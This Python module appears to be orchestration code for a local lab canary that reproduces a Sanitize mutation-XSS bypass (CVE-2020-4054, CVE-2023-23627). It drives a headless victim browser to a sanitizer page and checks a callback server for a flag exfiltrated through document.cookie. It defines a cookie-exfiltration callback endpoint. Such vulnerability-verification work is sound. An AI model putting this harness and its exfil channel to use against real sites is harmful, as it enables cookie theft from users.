#!/usr/bin/env python3
"""Shared orchestration for the Sanitize foreign-content -> noscript mutation-XSS canary
(CVE-2020-4054 -> CVE-2023-23627).

One "probe" = (1) reset the callback, (2) drive the headless victim to view the Sanitize-sink page
`/?html=<payload>` on a version, (3) read the callback. The observable result is the callback dump;
the per-run ${PCB_FLAG} appears there IFF Sanitize's output mutated in the browser into a live
`<img onerror>` that executed (proving execution, not reflection).

Same sink (`Sanitize.fragment(input, RELAXED+noscript)`), same exfil channel for seed and residual;
the ONLY difference is the smuggling vector -- non-allowlisted <math>/<svg> foreign content (seed,
closed in 5.2.1) vs allowlisted <noscript> scripting-desync (residual, closed in 6.0.1) -- and which
sanitize version (v0/v1/v2) is the guard.
"""
import urllib.parse
import urllib.request

# Host-published ports (oracle / PoCs run on the host).
HOST_APP = {
    "v0": "http://127.0.0.1:35120",
    "v1": "http://127.0.0.1:35121",
    "v2": "http://127.0.0.1:35122",
}
# Internal compose URLs the victim browser uses (Docker DNS by service name).
INTERNAL_APP = {"v0": "http://v0", "v1": "http://v1", "v2": "http://v2"}
VICTIM = "http://127.0.0.1:35170"
CALLBACK = "http://127.0.0.1:35190"

# Internal callback the exfil payload navigates to (protocol-relative -> resolves to http on the
# victim page). The flag rides along as document.cookie.
CB = "//callback:9000/c?f="


def _get(url, timeout=120):
    with urllib.request.urlopen(url, timeout=timeout) as r:
        return r.read().decode("utf-8", "replace")


def run_payload(html_payload: str, version: str, mode: str = "load") -> str:
    """Drive the victim to view the sink page with `html_payload` sanitized on `version`, and return
    the callback dump (flag lands there iff the sanitized output mutated into a live <img onerror>
    that executed)."""
    _get(CALLBACK + "/reset")
    q_app = urllib.parse.urlencode({"html": html_payload})
    target = INTERNAL_APP[version] + "/?" + q_app
    q = urllib.parse.urlencode(
        {"target": target, "origin": INTERNAL_APP[version] + "/", "mode": mode}
    )
    _get(VICTIM + "/visit?" + q)
    return _get(CALLBACK + "/dump")


def server_side_render(html_payload: str, version: str) -> str:
    """Return the exact server-side Sanitize output (via /raw) for the repro log."""
    q = urllib.parse.urlencode({"html": html_payload})
    return _get(HOST_APP[version] + "/raw?" + q)

import os as _pcb_os
_pt = _pcb_os.environ.get("PCB_TARGET_PORT")
if _pt and str(_pt).isdigit():
    for _v in HOST_APP:
        HOST_APP[_v] = f"http://127.0.0.1:{int(_pt)}"
_ptv = _pcb_os.environ.get("PCB_VICTIM_PORT")
if _ptv and str(_ptv).isdigit():
    VICTIM = "http://127.0.0.1:" + _ptv
_ptc = _pcb_os.environ.get("PCB_CALLBACK_PORT")
if _ptc and str(_ptc).isdigit():
    CALLBACK = "http://127.0.0.1:" + _ptc
